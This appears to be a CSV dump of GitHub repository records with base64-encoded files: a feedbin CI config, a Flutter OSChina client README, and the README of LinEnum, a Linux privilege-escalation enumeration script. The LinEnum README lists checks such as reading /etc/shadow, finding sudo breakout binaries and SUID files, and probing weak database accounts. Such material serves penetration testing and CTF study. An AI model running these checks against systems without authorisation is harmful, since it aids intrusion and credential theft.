c3ZnKV0oaHR0cHM6Ly9jb3ZlcmFsbHMuaW8vZ2l0aHViL2ZlZWRiaW4vZmVl
ZGJpbikK
",,"bGFuZ3VhZ2U6IHJ1YnkKY2FjaGU6IGJ1bmRsZXIKc3VkbzogcmVxdWlyZWQK
YnVuZGxlcl9hcmdzOiAtLXdpdGhvdXQgZGV2ZWxvcG1lbnQgLS1qb2JzIDIK
ZGlzdDogeGVuaWFsCgpzZXJ2aWNlczoKICAtIHJlZGlzLXNlcnZlcgogIC0g
bWVtY2FjaGVkCgphZGRvbnM6CiAgcG9zdGdyZXNxbDogIjkuNiIKICBjaHJv
bWU6IHN0YWJsZQogIGFydGlmYWN0czoKICAgIHBhdGhzOgogICAgICAtIC4v
dG1wL3NjcmVlbnNob3RzCmVudjoKICBnbG9iYWw6CiAgICAtIERCPXBvc3Rn
cmVzcWwKICAgIC0gS0lORExFR0VOX1BBVEg9L3RtcC9raW5kbGVnZW4va2lu
ZGxlZ2VuCiAgICAtIEVTX1ZFUlNJT049Mi4zLjMKICAgIC0gQ0hST01FX0RS
SVZFUl9WRVJTSU9OPTIuMzYKICAgIC0gUkFJTFNfRU5WPXRlc3QKCmJlZm9y
ZV9pbnN0YWxsOgogIC0gc3VkbyBhcHQtZ2V0IHJlbW92ZSBlbGFzdGljc2Vh
cmNoCiAgLSBzdWRvIHdnZXQgLXFPIC0gaHR0cHM6Ly9wYWNrYWdlcy5lbGFz
dGljLmNvL0dQRy1LRVktZWxhc3RpY3NlYXJjaCB8IHN1ZG8gYXB0LWtleSBh
ZGQgLQogIC0gZWNobyAiZGViIGh0dHA6Ly9wYWNrYWdlcy5lbGFzdGljLmNv
L2VsYXN0aWNzZWFyY2gvMi54L2RlYmlhbiBzdGFibGUgbWFpbiIgfCBzdWRv
IHRlZSAvZXRjL2FwdC9zb3VyY2VzLmxpc3QuZC9lbGFzdGljc2VhcmNoLTIu
eC5saXN0CiAgLSBzdWRvIGFwdC1nZXQgdXBkYXRlCiAgLSBzdWRvIGFwdC1n
ZXQgaW5zdGFsbCAteSBvcGVuamRrLTgtanJlIGVsYXN0aWNzZWFyY2ggbGli
aWRuMTEtZGV2CiAgLSBzdWRvIHNlcnZpY2UgZWxhc3RpY3NlYXJjaCByZXN0
YXJ0CiAgLSB3Z2V0ICJodHRwczovL2Nocm9tZWRyaXZlci5zdG9yYWdlLmdv
b2dsZWFwaXMuY29tLyR7Q0hST01FX0RSSVZFUl9WRVJTSU9OfS9jaHJvbWVk
cml2ZXJfbGludXg2NC56aXAiIC1PIC90bXAvY2hyb21lZHJpdmVyLnppcAog
IC0gdW56aXAgL3RtcC9jaHJvbWVkcml2ZXIuemlwIC1kIC90bXAvCiAgLSBt
diAvdG1wL2Nocm9tZWRyaXZlciAvaG9tZS90cmF2aXMvYmluLwogIC0gbWtk
aXIgL3RtcC9raW5kbGVnZW4KICAtIHdnZXQgLU8gLSBodHRwOi8va2luZGxl
Z2VuLnMzLmFtYXpvbmF3cy5jb20va2luZGxlZ2VuX2xpbnV4XzIuNl9pMzg2
X3YyXzkudGFyLmd6IHwgdGFyIHh6IC0tZGlyZWN0b3J5PS90bXAva2luZGxl
Z2VuCgoKYmVmb3JlX3NjcmlwdDoKICAtIHBzcWwgLWMgJ2NyZWF0ZSBkYXRh
YmFzZSBmZWVkYmluX3Rlc3Q7JyAtVSBwb3N0Z3JlcwogIC0gYnVuZGxlIGV4
ZWMgcmFrZSBkYjpzZXR1cAogIC0gYnVuZGxlIGV4ZWMgcmFrZSBkYjp0ZXN0
OnByZXBhcmUKICAtIGN1cmwgaHR0cDovLzEyNy4wLjAuMTo5MjAwLwoKc2Ny
aXB0OgogIC0gYmluL3JhaWxzIHRlc3QgdGVzdDpzeXN0ZW0K
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'LinEnum',12236152,b'Scripted Local Linux Enumeration & Privilege Escalation Checks',b'Shell',12,2376,,2376,False,b'https://api.github.com/repos/rebootuser/LinEnum/forks',"IyBMaW5FbnVtCkZvciBtb3JlIGluZm9ybWF0aW9uIHZpc2l0IHd3dy5yZWJv
b3R1c2VyLmNvbQoKTm90ZTogRXhwb3J0IGZ1bmN0aW9uYWxpdHkgaXMgY3Vy
cmVudGx5IGluIHRoZSBleHBlcmltZW50YWwgc3RhZ2UuCgpHZW5lcmFsIHVz
YWdlOgoKdmVyc2lvbiAwLjk4CgoqIEV4YW1wbGU6IC4vTGluRW51bS5zaCAt
cyAtayBrZXl3b3JkIC1yIHJlcG9ydCAtZSAvdG1wLyAtdCAKCk9QVElPTlM6
CiogLWsJRW50ZXIga2V5d29yZAoqIC1lCUVudGVyIGV4cG9ydCBsb2NhdGlv
bgoqIC10CUluY2x1ZGUgdGhvcm91Z2ggKGxlbmd0aHkpIHRlc3RzCiogLXMJ
U3VwcGx5IGN1cnJlbnQgdXNlciBwYXNzd29yZCB0byBjaGVjayBzdWRvIHBl
cm1zIChJTlNFQ1VSRSkKKiAtcglFbnRlciByZXBvcnQgbmFtZQoqIC1oCURp
c3BsYXlzIHRoaXMgaGVscCB0ZXh0CgoKUnVubmluZyB3aXRoIG5vIG9wdGlv
bnMgPSBsaW1pdGVkIHNjYW5zL25vIG91dHB1dCBmaWxlCgoqIC1lIFJlcXVp
cmVzIHRoZSB1c2VyIGVudGVycyBhbiBvdXRwdXQgbG9jYXRpb24gaS5lLiAv
dG1wL2V4cG9ydC4gSWYgdGhpcyBsb2NhdGlvbiBkb2VzIG5vdCBleGlzdCwg
aXQgd2lsbCBiZSBjcmVhdGVkLgoqIC1yIFJlcXVpcmVzIHRoZSB1c2VyIHRv
IGVudGVyIGEgcmVwb3J0IG5hbWUuIFRoZSByZXBvcnQgKC50eHQgZmlsZSkg
d2lsbCBiZSBzYXZlZCB0byB0aGUgY3VycmVudCB3b3JraW5nIGRpcmVjdG9y
eS4KKiAtdCBQZXJmb3JtcyB0aG9yb3VnaCAoc2xvdykgdGVzdHMuIFdpdGhv
dXQgdGhpcyBzd2l0Y2ggZGVmYXVsdCAncXVpY2snIHNjYW5zIGFyZSBwZXJm
b3JtZWQuCiogLXMgVXNlIHRoZSBjdXJyZW50IHVzZXIgd2l0aCBzdXBwbGll
ZCBwYXNzd29yZCB0byBjaGVjayBmb3Igc3VkbyBwZXJtaXNzaW9ucyAtIG5v
dGUgdGhpcyBpcyBpbnNlY3VyZSBhbmQgb25seSByZWFsbHkgZm9yIENURiB1
c2UhCiogLWsgQW4gb3B0aW9uYWwgc3dpdGNoIGZvciB3aGljaCB0aGUgdXNl
ciBjYW4gc2VhcmNoIGZvciBhIHNpbmdsZSBrZXl3b3JkIHdpdGhpbiBtYW55
IGZpbGVzIChkb2N1bWVudGVkIGJlbG93KS4KClNlZSBDSEFOR0VMT0cubWQg
Zm9yIGZ1cnRoZXIgZGV0YWlscwoKSGlnaC1sZXZlbCBzdW1tYXJ5IG9mIHRo
ZSBjaGVja3MvdGFza3MgcGVyZm9ybWVkIGJ5IExpbkVudW06CgoqIEtlcm5l
bCBhbmQgZGlzdHJpYnV0aW9uIHJlbGVhc2UgZGV0YWlscwoqIFN5c3RlbSBJ
bmZvcm1hdGlvbjoKICAqIEhvc3RuYW1lCiAgKiBOZXR3b3JraW5nIGRldGFp
bHM6CiAgKiBDdXJyZW50IElQCiAgKiBEZWZhdWx0IHJvdXRlIGRldGFpbHMK
ICAqIEROUyBzZXJ2ZXIgaW5mb3JtYXRpb24KKiBVc2VyIEluZm9ybWF0aW9u
OgogICogQ3VycmVudCB1c2VyIGRldGFpbHMKICAqIExhc3QgbG9nZ2VkIG9u
IHVzZXJzCiAgKiBTaG93cyB1c2VycyBsb2dnZWQgb250byB0aGUgaG9zdAog
ICogTGlzdCBhbGwgdXNlcnMgaW5jbHVkaW5nIHVpZC9naWQgaW5mb3JtYXRp
b24KICAqIExpc3Qgcm9vdCBhY2NvdW50cwogICogRXh0cmFjdHMgcGFzc3dv
cmQgcG9saWNpZXMgYW5kIGhhc2ggc3RvcmFnZSBtZXRob2QgaW5mb3JtYXRp
b24KICAqIENoZWNrcyB1bWFzayB2YWx1ZQogICogQ2hlY2tzIGlmIHBhc3N3
b3JkIGhhc2hlcyBhcmUgc3RvcmVkIGluIC9ldGMvcGFzc3dkCiAgKiBFeHRy
YWN0IGZ1bGwgZGV0YWlscyBmb3Ig4oCYZGVmYXVsdOKAmSB1aWTigJlzIHN1
Y2ggYXMgMCwgMTAwMCwgMTAwMSBldGMKICAqIEF0dGVtcHQgdG8gcmVhZCBy
ZXN0cmljdGVkIGZpbGVzIGkuZS4gL2V0Yy9zaGFkb3cKICAqIExpc3QgY3Vy
cmVudCB1c2VycyBoaXN0b3J5IGZpbGVzIChpLmUgLmJhc2hfaGlzdG9yeSwg
Lm5hbm9faGlzdG9yeSBldGMuKQogICogQmFzaWMgU1NIIGNoZWNrcwoqIFBy
aXZpbGVnZWQgYWNjZXNzOgogICogV2hpY2ggdXNlcnMgaGF2ZSByZWNlbnRs
eSB1c2VkIHN1ZG8KICAqIERldGVybWluZSBpZiAvZXRjL3N1ZG9lcnMgaXMg
YWNjZXNzaWJsZQogICogRGV0ZXJtaW5lIGlmIHRoZSBjdXJyZW50IHVzZXIg
aGFzIFN1ZG8gYWNjZXNzIHdpdGhvdXQgYSBwYXNzd29yZAogICogQXJlIGtu
b3duIOKAmGdvb2TigJkgYnJlYWtvdXQgYmluYXJpZXMgYXZhaWxhYmxlIHZp
YSBTdWRvIChpLmUuIG5tYXAsIHZpbSBldGMuKQogICogSXMgcm9vdOKAmXMg
aG9tZSBkaXJlY3RvcnkgYWNjZXNzaWJsZQogICogTGlzdCBwZXJtaXNzaW9u
cyBmb3IgL2hvbWUvCiogRW52aXJvbm1lbnRhbDoKICAqIERpc3BsYXkgY3Vy
cmVudCAkUEFUSAogICogRGlzcGxheXMgZW52IGluZm9ybWF0aW9uCiogSm9i
cy9UYXNrczoKICAqIExpc3QgYWxsIGNyb24gam9icwogICogTG9jYXRlIGFs
bCB3b3JsZC13cml0YWJsZSBjcm9uIGpvYnMKICAqIExvY2F0ZSBjcm9uIGpv
YnMgb3duZWQgYnkgb3RoZXIgdXNlcnMgb2YgdGhlIHN5c3RlbQogICogTGlz
dCB0aGUgYWN0aXZlIGFuZCBpbmFjdGl2ZSBzeXN0ZW1kIHRpbWVycwoqIFNl
cnZpY2VzOgogICogTGlzdCBuZXR3b3JrIGNvbm5lY3Rpb25zIChUQ1AgJiBV
RFApCiAgKiBMaXN0IHJ1bm5pbmcgcHJvY2Vzc2VzCiAgKiBMb29rdXAgYW5k
IGxpc3QgcHJvY2VzcyBiaW5hcmllcyBhbmQgYXNzb2NpYXRlZCBwZXJtaXNz
aW9ucwogICogTGlzdCBpbmV0ZC5jb25mL3hpbmVkLmNvbmYgY29udGVudHMg
YW5kIGFzc29jaWF0ZWQgYmluYXJ5IGZpbGUgcGVybWlzc2lvbnMKICAqIExp
c3QgaW5pdC5kIGJpbmFyeSBwZXJtaXNzaW9ucwoqIFZlcnNpb24gSW5mb3Jt
YXRpb24gKG9mIHRoZSBmb2xsb3dpbmcpOgogICogU3VkbwogICogTVlTUUwK
ICAqIFBvc3RncmVzCiAgKiBBcGFjaGUKICAgICogQ2hlY2tzIHVzZXIgY29u
ZmlnCiAgICAqIFNob3dzIGVuYWJsZWQgbW9kdWxlcwogICAgKiBDaGVja3Mg
Zm9yIGh0cGFzc3dkIGZpbGVzCiAgICAqIFZpZXcgd3d3IGRpcmVjdG9yaWVz
CiogRGVmYXVsdC9XZWFrIENyZWRlbnRpYWxzOgogICogQ2hlY2tzIGZvciBk
ZWZhdWx0L3dlYWsgUG9zdGdyZXMgYWNjb3VudHMKICAqIENoZWNrcyBmb3Ig
ZGVmYXVsdC93ZWFrIE1ZU1FMIGFjY291bnRzCiogU2VhcmNoZXM6CiAgKiBM
b2NhdGUgYWxsIFNVSUQvR1VJRCBmaWxlcwogICogTG9jYXRlIGFsbCB3b3Js
ZC13cml0YWJsZSBTVUlEL0dVSUQgZmlsZXMKICAqIExvY2F0ZSBhbGwgU1VJ
RC9HVUlEIGZpbGVzIG93bmVkIGJ5IHJvb3QKICAqIExvY2F0ZSDigJhpbnRl
cmVzdGluZ+KAmSBTVUlEL0dVSUQgZmlsZXMgKGkuZS4gbm1hcCwgdmltIGV0
YykKICAqIExvY2F0ZSBmaWxlcyB3aXRoIFBPU0lYIGNhcGFiaWxpdGllcwog
ICogTGlzdCBhbGwgd29ybGQtd3JpdGFibGUgZmlsZXMKICAqIEZpbmQvbGlz
dCBhbGwgYWNjZXNzaWJsZSAqLnBsYW4gZmlsZXMgYW5kIGRpc3BsYXkgY29u
dGVudHMKICAqIEZpbmQvbGlzdCBhbGwgYWNjZXNzaWJsZSAqLnJob3N0cyBm
aWxlcyBhbmQgZGlzcGxheSBjb250ZW50cwogICogU2hvdyBORlMgc2VydmVy
IGRldGFpbHMKICAqIExvY2F0ZSAqLmNvbmYgYW5kICoubG9nIGZpbGVzIGNv
bnRhaW5pbmcga2V5d29yZCBzdXBwbGllZCBhdCBzY3JpcHQgcnVudGltZQog
ICogTGlzdCBhbGwgKi5jb25mIGZpbGVzIGxvY2F0ZWQgaW4gL2V0YwogICog
TG9jYXRlIG1haWwKKiBQbGF0Zm9ybS9zb2Z0d2FyZSBzcGVjaWZpYyB0ZXN0
czoKICAqIENoZWNrcyB0byBkZXRlcm1pbmUgaWYgd2UncmUgaW4gYSBEb2Nr
ZXIgY29udGFpbmVyCiAgKiBDaGVja3MgdG8gc2VlIGlmIHRoZSBob3N0IGhh
cyBEb2NrZXIgaW5zdGFsbGVkCiAgKiBDaGVja3MgdG8gZGV0ZXJtaW5lIGlm
IHdlJ3JlIGluIGFuIExYQyBjb250YWluZXIK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'flutter-osc',132440277,b'\xe5\x9f\xba\xe4\xba\x8eGoogle Flutter\xe7\x9a\x84\xe5\xbc\x80\xe6\xba\x90\xe4\xb8\xad\xe5\x9b\xbd\xe5\xae\xa2\xe6\x88\xb7\xe7\xab\xaf\xef\xbc\x8c\xe6\x94\xaf\xe6\x8c\x81Android\xe5\x92\x8ciOS\xe3\x80\x82',b'Dart',8,2376,,2376,False,b'https://api.github.com/repos/yubo725/flutter-osc/forks',"IyBGbHV0dGVyT1NDCi0g5Z+65LqOR29vZ2xlIEZsdXR0ZXLnmoTlvIDmupDk
uK3lm73lrqLmiLfnq6/vvIzmlK/mjIFBbmRyb2lk5ZKMaU9T44CCCi0gW+WF
s+S6jkdvb2dsZSBGbHV0dGVyXShodHRwczovL2ZsdXR0ZXIuaW8vKQoKIyBB
bmRyb2lk5omr56CB5LiL6L29QVBLCi0g6K+35L2/55So5omL5py65rWP6KeI
5Zmo5omr56CB5LiL6L2977yM5LiN6KaB5L2/55So5b6u5L+h5oiW6ICFcXHm
iavnoIEKLSA8aW1nIHNyYz0nLi9zY3JlZW5zaG90cy9mbHV0dGVyX29zY19x
cmNvZGUucG5nJz4KCiMg5Yqf6IO9Ci0gW3hdIOeZu+W9le+8iOS9v+eUqG9z
Y+i0puWPt++8iQotIFt4XSDmn6XnnIvotYTorq/vvIjmnKrnmbvlvZXljbPl
j6/mn6XnnIvvvIkKLSBbeF0g5p+l55yL44CB5Zue5aSN44CB5Y+R6KGo44CB
6K+E6K665Yqo5by577yI6ZyA6KaB55m75b2V77yJCi0gW3hdIOWKqOW8ueWw
j+m7keWxi++8iOmcgOimgeeZu+W9le+8iQotIFt4XSDigJzlj5HnjrDigJ3p
g6jliIbnmoTlip/og73ln7rmnKzkuIrpg73mmK/nlKhINeWunueOsAotIFt4
XSDotYTorq/liJfooajjgIHliqjlvLnliJfooajjgIHor4TorrrliJfooajm
lK/mjIHkuIvmi4nliLfmlrDmiJbliIbpobXliqDovb0KLSBbeF0g5pSv5oyB
5Li76aKY5YiH5o2i77yI5YWl5Y+j5Zyo5L6n5ruR6I+c5Y2VLeiuvue9ri3l
iIfmjaLkuLvpopjvvIkKLSBbIF0g5Yqo5by55Lit55qE5Zu+54mH6aKE6KeI
5pqC5pyq5a6e546wCi0gWyBdIOaRh+S4gOaRh+OAgeKAnOaIkeeahOKAnemh
temdouWKn+iDveaaguaXtuayoeWujOaIkAoKIyDor7TmmI4KMS4gfn7nlLHk
uo7lvIDmupDkuK3lm73nmoRvcGVuYXBp5Y+q5o+Q5L6b5LqG5Z+65LqOd2Vi
dmlld+aIlua1j+iniOWZqOeahG9hdXRo6K6k6K+B5pa55byP77yM5pWF6K+l
6aG555uu55m75b2V55WM6Z2i5L2/55Sod2Vidmlld+WKoOi9vU9TQ2hpbmHk
uInmlrnorqTor4HpobXpnaLvvIzor7fmlL7lv4Pkvb/nlKjlvIDmupDkuK3l
m73nmoTotKblj7flkozlr4bnoIHnmbvlvZV+fuebruWJjeivpemhueebruaU
r+aMgeWOn+eUn+eZu+W9lemhtemdouWSjFdlYlZpZXfmlrnlvI/nmbvlvZUK
Mi4g5Y+X5byA5rqQ5Lit5Zu9b3BlbmFwaeeahOmZkOWItu+8jOiOt+WPluWK
qOW8ueaVsOaNrumcgOimgeeZu+W9le+8jOeUseS6jm9wZW5hcGnnmoTotYTo
rq/mjqXlj6Pmj5DkvpvnmoTmlbDmja7mr5TovoPnroDljZXvvIzmlYXotYTo
rq/pg6jliIbph4fnlKhweXRob27niKzlj5bnmoTnvZHpobXmlbDmja4KMy4g
5pys6aG555uu57qv5bGe5Liq5Lq65YW06Laj54ix5aW96ICM5YaZ77yM5LiN
5piv5byA5rqQ5Lit5Zu95a6Y5pa554mI5pys77yM5rqQ5Luj56CB5LuF5L6b
5a2m5Lmg5Lqk5rWB77yM5a6e6ZmF5L2/55So6K+35LiL6L295a6J6KOF5byA
5rqQ5Lit5Zu9W+WumOaWuUFQUF0oaHR0cHM6Ly93d3cub3NjaGluYS5uZXQv
YXBwKQoKIyDmiKrlm74KIyMjIyBpT1MKPGRpdj4KICAgIDxpbWcgc3JjPScu
L3NjcmVlbnNob3RzL2lvcy10aGVtZS0wMS5wbmcnIHdpZHRoPTI4MD4KICAg
IDxpbWcgc3JjPScuL3NjcmVlbnNob3RzL2lvcy10aGVtZS0wMi5wbmcnIHdp
ZHRoPTI4MD4KICAgIDxpbWcgc3JjPScuL3NjcmVlbnNob3RzL2lvcy10aGVt
ZS0wMy5wbmcnIHdpZHRoPTI4MD4KPC9kaXY+CjxkaXY+CiAgICA8aW1nIHNy
Yz0nLi9zY3JlZW5zaG90cy9pb3MwMS5wbmcnIHdpZHRoPTI4MD4KICAgIDxp
bWcgc3JjPScuL3NjcmVlbnNob3RzL2lvczAyLnBuZycgd2lkdGg9MjgwPgog
ICAgPGltZyBzcmM9Jy4vc2NyZWVuc2hvdHMvaW9zMTAucG5nJyB3aWR0aD0y
ODA+CjwvZGl2Pgo8ZGl2PgogICAgPGltZyBzcmM9Jy4vc2NyZWVuc2hvdHMv
aW9zMDQucG5nJyB3aWR0aD0yODA+CiAgICA8aW1nIHNyYz0nLi9zY3JlZW5z
aG90cy9pb3MwNS5wbmcnIHdpZHRoPTI4MD4KICAgIDxpbWcgc3JjPScuL3Nj
cmVlbnNob3RzL2lvczA2LnBuZycgd2lkdGg9MjgwPgo8L2Rpdj4KPGRpdj4K
ICAgIDxpbWcgc3JjPScuL3NjcmVlbnNob3RzL2lvczA3LnBuZycgd2lkdGg9
MjgwPgogICAgPGltZyBzcmM9Jy4vc2NyZWVuc2hvdHMvaW9zMDgucG5nJyB3
aWR0aD0yODA+CiAgICA8aW1nIHNyYz0nLi9zY3JlZW5zaG90cy9pb3MwOS5w
bmcnIHdpZHRoPTI4MD4KPC9kaXY+CgojIyMjIEFuZHJvaWQKPGRpdj4KICAg
IDxpbWcgc3JjPScuL3NjcmVlbnNob3RzL2FuZHJvaWQwMS5qcGcnIHdpZHRo
PTI4MD4KICAgIDxpbWcgc3JjPScuL3NjcmVlbnNob3RzL2FuZHJvaWQwMi5q
cGcnIHdpZHRoPTI4MD4KICAgIDxpbWcgc3JjPScuL3NjcmVlbnNob3RzL2Fu
ZHJvaWQwMy5qcGcnIHdpZHRoPTI4MD4KPC9kaXY+CjxkaXY+CiAgICA8aW1n
IHNyYz0nLi9zY3JlZW5zaG90cy9hbmRyb2lkMDQuanBnJyB3aWR0aD0yODA+
CiAgICA8aW1nIHNyYz0nLi9zY3JlZW5zaG90cy9hbmRyb2lkMDUuanBnJyB3
aWR0aD0yODA+CiAgICA8aW1nIHNyYz0nLi9zY3JlZW5zaG90cy9hbmRyb2lk
MDYuanBnJyB3aWR0aD0yODA+CjwvZGl2Pgo8ZGl2PgogICAgPGltZyBzcmM9
Jy4vc2NyZWVuc2hvdHMvYW5kcm9pZDA3LmpwZycgd2lkdGg9MjgwPgogICAg
PGltZyBzcmM9Jy4vc2NyZWVuc2hvdHMvYW5kcm9pZDA4LmpwZycgd2lkdGg9
MjgwPgogICAgPGltZyBzcmM9Jy4vc2NyZWVuc2hvdHMvYW5kcm9pZDA5Lmpw
Zycgd2lkdGg9MjgwPgo8L2Rpdj4KCiMgTElDRU5TRQpUaGUgTUlUIExpY2Vu
c2UgKE1JVCkKCkNvcHlyaWdodCAoYykgMjAxOCB5dWJvXzcyNQoKUGVybWlz
c2lvbiBpcyBoZXJlYnkgZ3JhbnRlZCwgZnJlZSBvZiBjaGFyZ2UsIHRvIGFu
eSBwZXJzb24gb2J0YWluaW5nIGEgY29weSBvZgp0aGlzIHNvZnR3YXJlIGFu
ZCBhc3NvY2lhdGVkIGRvY3VtZW50YXRpb24gZmlsZXMgKHRoZSAiU29mdHdh
cmUiKSwgdG8gZGVhbCBpbgp0aGUgU29mdHdhcmUgd2l0aG91dCByZXN0cmlj
dGlvbiwgaW5jbHVkaW5nIHdpdGhvdXQgbGltaXRhdGlvbiB0aGUgcmlnaHRz
IHRvCnVzZSwgY29weSwgbW9kaWZ5LCBtZXJnZSwgcHVibGlzaCwgZGlzdHJp
YnV0ZSwgc3VibGljZW5zZSwgYW5kL29yIHNlbGwgY29waWVzIG9mCnRoZSBT
b2Z0d2FyZSwgYW5kIHRvIHBlcm1pdCBwZXJzb25zIHRvIHdob20gdGhlIFNv
ZnR3YXJlIGlzIGZ1cm5pc2hlZCB0byBkbyBzbywKc3ViamVjdCB0byB0aGUg
Zm9sbG93aW5nIGNvbmRpdGlvbnM6CgpUaGUgYWJvdmUgY29weXJpZ2h0IG5v
dGljZSBhbmQgdGhpcyBwZXJtaXNzaW9uIG5vdGljZSBzaGFsbCBiZSBpbmNs
dWRlZCBpbiBhbGwKY29waWVzIG9yIHN1YnN0YW50aWFsIHBvcnRpb25zIG9m
IHRoZSBTb2Z0d2FyZS4KClRIRSBTT0ZUV0FSRSBJUyBQUk9WSURFRCAiQVMg
SVMiLCBXSVRIT1VUIFdBUlJBTlRZIE9GIEFOWSBLSU5ELCBFWFBSRVNTIE9S
CklNUExJRUQsIElOQ0xVRElORyBCVVQgTk9UIExJTUlURUQgVE8gVEhFIFdB
UlJBTlRJRVMgT0YgTUVSQ0hBTlRBQklMSVRZLCBGSVRORVNTCkZPUiBBIFBB
UlRJQ1VMQVIgUFVSUE9TRSBBTkQgTk9OSU5GUklOR0VNRU5ULiBJTiBOTyBF
VkVOVCBTSEFMTCBUSEUgQVVUSE9SUyBPUgpDT1BZUklHSFQgSE9MREVSUyBC
RSBMSUFCTEUgRk9SIEFOWSBDTEFJTSwgREFNQUdFUyBPUiBPVEhFUiBMSUFC
SUxJVFksIFdIRVRIRVIKSU4gQU4gQUNUSU9OIE9GIENPTlRSQUNULCBUT1JU
IE9SIE9USEVSV0lTRSwgQVJJU0lORyBGUk9NLCBPVVQgT0YgT1IgSU4KQ09O
TkVDVElPTiBXSVRIIFRIRSBTT0ZUV0FSRSBPUiBUSEUgVVNFIE9SIE9USEVS
IERFQUxJTkdTIElOIFRIRSBTT0ZUV0FSRS4K
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
